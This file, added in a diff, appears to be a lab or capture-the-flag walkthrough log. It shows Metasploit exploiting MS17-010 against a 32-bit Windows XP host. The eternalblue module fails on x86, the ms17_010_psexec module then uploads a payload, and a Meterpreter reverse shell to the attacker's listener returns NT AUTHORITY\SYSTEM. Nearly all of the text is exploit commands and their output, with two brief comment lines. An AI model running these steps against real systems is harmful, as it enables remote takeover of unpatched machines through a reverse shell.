@@ -1,0 +1,80 @@
+
+
+
+This is a classic Windows XP/2000-era box with SMBv1, 
+message signing disabled, and only ports 135/139/445 open
+
+msf > use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.4
+RHOSTS => 10.10.10.4
+msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.38
+LHOST => 10.10.14.38
+msf exploit(windows/smb/ms17_010_eternalblue) > run
+[*] Started reverse TCP handler on 10.10.14.38:4444 
+[*] 10.10.10.4:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.10.4:445        - Host is likely VULNERABLE to MS17-010! - Windows 5.1 x86 (32-bit)
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
+[+] 10.10.10.4:445 - The target is vulnerable.
+[-] 10.10.10.4:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x86/meterpreter/reverse_tcp
+[-] The value specified for PAYLOAD is not valid.
+msf exploit(windows/smb/ms17_010_eternalblue) > 
+
+
+we must use the older module for 32-bit targets
+
+
+
+msf exploit(windows/smb/ms17_010_eternalblue) > use exploit/windows/smb/ms17_010_psexec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.4
+RHOSTS => 10.10.10.4
+msf exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.38
+LHOST => 10.10.14.38
+msf exploit(windows/smb/ms17_010_psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf exploit(windows/smb/ms17_010_psexec) > run
+[*] Started reverse TCP handler on 10.10.14.38:4444 
+[*] 10.10.10.4:445 - Target OS: Windows 5.1
+[*] 10.10.10.4:445 - Filling barrel with fish... done
+[*] 10.10.10.4:445 - <---------------- | Entering Danger Zone | ---------------->
+[*] 10.10.10.4:445 - 	[*] Preparing dynamite...
+[*] 10.10.10.4:445 - 		[*] Trying stick 1 (x86)...Boom!
+[*] 10.10.10.4:445 - 	[+] Successfully Leaked Transaction!
+[*] 10.10.10.4:445 - 	[+] Successfully caught Fish-in-a-barrel
+[*] 10.10.10.4:445 - <---------------- | Leaving Danger Zone | ---------------->
+[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x86112820
+[*] 10.10.10.4:445 - Built a write-what-where primitive...
+[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
+[*] 10.10.10.4:445 - Selecting native target
+[*] 10.10.10.4:445 - Uploading payload... Ppkndgfo.exe
+[*] 10.10.10.4:445 - Created \Ppkndgfo.exe...
+[+] 10.10.10.4:445 - Service started successfully...
+[*] Sending stage (177734 bytes) to 10.10.10.4
+[*] 10.10.10.4:445 - Deleting \Ppkndgfo.exe...
+[*] Meterpreter session 1 opened (10.10.14.38:4444 -> 10.10.10.4:1032) at 2025-12-18 12:57:47 -0500
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
